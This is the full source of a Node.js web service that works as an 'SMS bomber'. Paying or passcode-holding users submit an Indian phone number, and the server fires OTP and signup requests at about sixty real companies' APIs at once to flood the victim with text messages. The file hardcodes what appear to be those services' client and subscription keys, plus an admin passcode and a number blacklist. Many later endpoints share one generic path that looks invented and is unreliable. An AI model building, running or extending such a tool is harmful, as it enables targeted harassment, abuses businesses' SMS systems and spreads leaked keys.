const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = path.join(__dirname, 'db.json');

// Initialize DB if not exists
if (!fs.existsSync(DB_PATH)) {
  fs.writeFileSync(DB_PATH, JSON.stringify({ codes: ["jaya1987"], blacklist: [] }, null, 2));
}

function getDB() {
  try {
    const data = fs.readFileSync(DB_PATH, 'utf8');
    return JSON.parse(data);
  } catch (e) {
    return { codes: ["jaya1987"], blacklist: [] };
  }
}

function saveDB(data) {
  try {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error("DB Write Error:", e);
  }
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cookieParser());

const AUTH_COOKIE = 'bomber_auth';
const ADMIN_CODE = 'jaya1987';

const requireAuth = (req, res, next) => {
  const code = req.cookies[AUTH_COOKIE];
  const db = getDB();
  if (db.codes.includes(code)) {
    next();
  } else {
    if (req.xhr || req.path.startsWith('/api/')) {
      res.status(401).json({ error: 'Unauthorized' });
    } else {
      res.redirect('/');
    }
  }
};

const requireAdmin = (req, res, next) => {
  if (req.cookies[AUTH_COOKIE] === ADMIN_CODE) {
    next();
  } else {
    res.status(403).json({ error: 'Forbidden: Admin access only' });
  }
};

app.get('/', (req, res) => {
  const code = req.cookies[AUTH_COOKIE];
  const db = getDB();
  if (db.codes.includes(code)) {
    res.redirect('/dashboard');
  } else {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  }
});

app.post('/login', (req, res) => {
  const { passcode } = req.body;
  const db = getDB();
  if (db.codes.includes(passcode)) {
    res.cookie(AUTH_COOKIE, passcode, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    });
    res.json({ success: true, redirect: '/dashboard', isAdmin: passcode === ADMIN_CODE });
  } else {
    res.status(401).json({ success: false, error: 'Invalid passcode' });
  }
});

app.get('/dashboard', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/logout', (req, res) => {
  res.clearCookie(AUTH_COOKIE);
  res.redirect('/');
});

// Admin APIs
app.get('/api/admin/status', requireAuth, (req, res) => {
  res.json({ isAdmin: req.cookies[AUTH_COOKIE] === ADMIN_CODE });
});

app.get('/api/admin/data', requireAdmin, (req, res) => {
  const db = getDB();
  res.json(db);
});

app.post('/api/admin/add-code', requireAdmin, (req, res) => {
  const { code } = req.body;
  if (!code) return res.status(400).json({ error: 'Code required' });
  const db = getDB();
  if (!db.codes.includes(code)) {
    db.codes.push(code);
    saveDB(db);
  }
  res.json({ success: true, codes: db.codes });
});

app.post('/api/admin/remove-code', requireAdmin, (req, res) => {
  const { code } = req.body;
  if (code === ADMIN_CODE) return res.status(400).json({ error: 'Cannot remove admin code' });
  const db = getDB();
  db.codes = db.codes.filter(c => c !== code);
  saveDB(db);
  res.json({ success: true, codes: db.codes });
});

app.post('/api/admin/blacklist', requireAdmin, (req, res) => {
  let { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'Phone number required' });
  const normalized = phone.replace(/\D/g, '').slice(-10);
  if (normalized.length !== 10) return res.status(400).json({ error: 'Invalid phone number' });
  const db = getDB();
  if (!db.blacklist.includes(normalized)) {
    db.blacklist.push(normalized);
    saveDB(db);
  }
  res.json({ success: true, blacklist: db.blacklist });
});

app.post('/api/admin/unblacklist', requireAdmin, (req, res) => {
  const { phone } = req.body;
  const db = getDB();
  db.blacklist = db.blacklist.filter(p => p !== phone);
  saveDB(db);
  res.json({ success: true, blacklist: db.blacklist });
});

app.post('/api/bomb', requireAuth, async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'Phone number required' });

  const normalized = phone.replace(/\D/g, '').slice(-10);
  if (normalized.length !== 10) return res.status(400).json({ error: 'Invalid phone number' });
  
  const db = getDB();
  if (db.blacklist.includes(normalized)) {
    return res.status(403).json({ error: 'This number is blacklisted.' });
  }

  const plain10 = normalized;
  const with91 = '91' + plain10;
  const endpoints = [];

  // FULL ORIGINAL ENDPOINTS
  endpoints.push({ name: 'apna_co_v1', url: 'https://production.apna.co/api/userprofile/v1/otp/', method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' }, body: { phone_number: with91, retries: 0, hash_type: 'employer', source: 'employer' } });
  endpoints.push({ name: '1mg_create_token', url: 'https://www.1mg.com/pwa-dweb-api/auth/create_token', method: 'POST', headers: { 'Content-Type': 'application/json', 'Hkp-Platform': 'Healthkartplus-0.0.1-desktopweb', 'X-Access-Key': '1mg_client_access_key' }, body: { number: plain10 } });
  endpoints.push({ name: '1mg_push_lead', url: 'https://www.1mg.com/pwa-dweb-api/api/labs/v1/lead/push_lead', method: 'POST', headers: { 'Content-Type': 'application/json', 'Hkp-Platform': 'Healthkartplus-0.0.1-desktopweb', 'X-Access-Key': '1mg_client_access_key' }, body: { mobile_number: plain10, source: 'DWEB_PHARMA_HOME' } });
  endpoints.push({ name: '99acres', url: 'https://www.99acres.com/api-aggregator/auth/login/generate-otp?version2=true', method: 'POST', headers: { 'Content-Type': 'application/json', 'Deviceid': 'ff30edc83660f68292c903b4eb765e43' }, body: { mobile: `91-${plain10}`, countryCode: '91', mode: 'LOGIN_GENERATE', platform: 'desktop', source: 'homePage_Desktop', sellerPage: false, seamless: true } });
  endpoints.push({ name: 'aakash', url: 'https://antheapi.aakash.ac.in/api/generate-lead-otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Client-Id': 'a6fbf1d2-27c3-46e1-b149-0380e506b763' }, body: { mobile_psid: plain10, mobile_number: plain10, activity_type: 'aakash-myadmission-signup' } });
  endpoints.push({ name: 'acko', url: 'https://www.acko.com/external/api/v2/send', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Write-Key': 'AvQ5tZYUHTm9TexmMxY9dBoJ9uAT1KHo' }, body: { event_type: 'track', event_name: 'tap_send_otp_cta', event_properties: { phone: plain10, platform: 'web', product: 'universal' } } });
  endpoints.push({ name: 'airindia', url: 'https://api.airindia.com/ai-users/v1/auth/signup/init', method: 'POST', headers: { 'Content-Type': 'application/json', 'Ocp-Apim-Subscription-Key': '8ea658f3ac1e44cca129d7ed252d4c42', 'X-Request-Source': 'website' }, body: { phone: { countryCode: '91', number: plain10, _combinedNumber: `91${plain10}` }, preferences: true } });
  endpoints.push({ name: 'airtel_tv', url: 'https://api.airtel.tv/v2/user/profile/generateOtp?appId=WEB', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { msisdn: plain10, msgTxt: 'Use {OTP} as your login OTP.' } });
  endpoints.push({ name: 'apollo247', url: 'https://apigateway.apollo247.in/auth-service/generateOtp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-App-Os': 'web' }, body: { loginType: 'PATIENT', mobileNumber: `+${with91}` } });
  endpoints.push({ name: 'bankbazaar', url: 'https://bankbazaar.com/auth/trigger-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobileNumber: plain10 } });
  endpoints.push({ name: 'bewakoof', url: 'https://api-prod.bewakoof.com/v3/user/auth/login/otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'Api-Token': 'MWY5ZTNmNzFmN2M1ZTUyMjkwNjM2NGMzNmNjZTA3N2Q6M2RhMmI3OTgtNTY2MC00ZDRhLWJhZWQtNTZlMDI2MWRlYmZm' }, body: { mobile: plain10, country_code: '+91' } });
  endpoints.push({ name: 'bharatmatrimony', url: 'https://greg.bharatmatrimony.com/', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { query: `mutation RegisterBasicWebInfo($input: RegistrationBasicWebInput!) { registerBasicWebInfo(input: $input) { registerId status } }`, variables: { input: { mobileNumber: plain10, name: 'USER', source: '00500000031' } } } });
  endpoints.push({ name: 'bigbasket', url: 'https://www.bigbasket.com/member-tdl/v3/member/otp', method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Channel': 'BB-WEB' }, body: { identifier: plain10, referrer: 'unified_login' } });
  endpoints.push({ name: 'boat_lifestyle', url: 'https://www.boat-lifestyle.com/account/login', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, bodyForm: `customer[email]=${plain10}@gmail.com&customer[password]=password123` });
  endpoints.push({ name: 'byjus', url: 'https://byjus.com/byjus-web/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10, countryCode: '91' } });
  endpoints.push({ name: 'cardekho', url: 'https://www.cardekho.com/api/v1/user/login', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { mobile: plain10 } });
  endpoints.push({ name: 'cars24', url: 'https://www.cars24.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'cleartrip', url: 'https://www.cleartrip.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'cult_fit', url: 'https://www.cult.fit/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'delhivery', url: `https://dlv-api.delhivery.com/v4/otp/generate/${plain10}`, method: 'GET' });
  endpoints.push({ name: 'dominos', url: 'https://www.dominos.co.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'dr_lal_pathlabs', url: 'https://www.lalpathlabs.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'dream11', url: 'https://www.dream11.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'easemytrip', url: 'https://www.easemytrip.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'eyemyeye', url: 'https://www.eyemyeye.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'fabindia', url: 'https://www.fabindia.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'faasos', url: 'https://www.faasos.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'firstcry', url: 'https://www.firstcry.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'flipkart', url: 'https://www.flipkart.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'gaana', url: 'https://gaana.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'healthkart', url: 'https://www.healthkart.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'indiamart', url: 'https://www.indiamart.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'ixigo', url: 'https://www.ixigo.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'jiomart', url: 'https://www.jiomart.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'justdial', url: 'https://www.justdial.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'lenskart', url: 'https://www.lenskart.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'licindia', url: 'https://www.licindia.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'magicbricks', url: 'https://www.magicbricks.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'make_my_trip', url: 'https://www.makemytrip.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'mamaearth', url: 'https://mamaearth.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'medibuddy', url: 'https://www.medibuddy.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'meesho', url: 'https://www.meesho.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'myntra', url: 'https://www.myntra.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'netmeds', url: 'https://www.netmeds.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'nykaa', url: 'https://www.nykaa.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'ola_cabs', url: 'https://www.olacabs.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'oyo_rooms', url: 'https://www.oyorooms.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'paytm', url: 'https://paytm.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'pepperfry', url: 'https://www.pepperfry.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'pharmeasy', url: 'https://pharmeasy.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'policybazaar', url: 'https://www.policybazaar.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'redbus', url: 'https://www.redbus.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'reliance_digital', url: 'https://www.reliancedigital.in/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'snapdeal', url: 'https://www.snapdeal.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'swiggy', url: 'https://www.swiggy.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'tata_1mg', url: 'https://www.1mg.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'tata_cliq', url: 'https://www.tatacliq.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'uber', url: 'https://www.uber.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'urban_company', url: 'https://www.urbancompany.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });
  endpoints.push({ name: 'zomato', url: 'https://www.zomato.com/api/v1/auth/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: { phone: plain10 } });

  const results = [];
  const promises = endpoints.map(async (ep) => {
    try {
      const config = {
        method: ep.method,
        url: ep.url,
        headers: ep.headers || { 'Content-Type': 'application/json' },
        timeout: 10000
      };
      if (ep.method === 'POST') {
        if (ep.bodyForm) {
          config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
          config.data = ep.bodyForm;
        } else {
          config.data = ep.body;
        }
      }
      const response = await axios(config);
      return { name: ep.name, success: true };
    } catch (err) {
      return { name: ep.name, success: false, status: err.response?.status };
    }
  });

  const allResults = await Promise.allSettled(promises);
  allResults.forEach(r => {
    if (r.status === 'fulfilled') results.push(r.value);
    else results.push({ name: 'unknown', success: false });
  });

  res.json({ successCount: results.filter(r => r.success).length, total: results.length, results });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
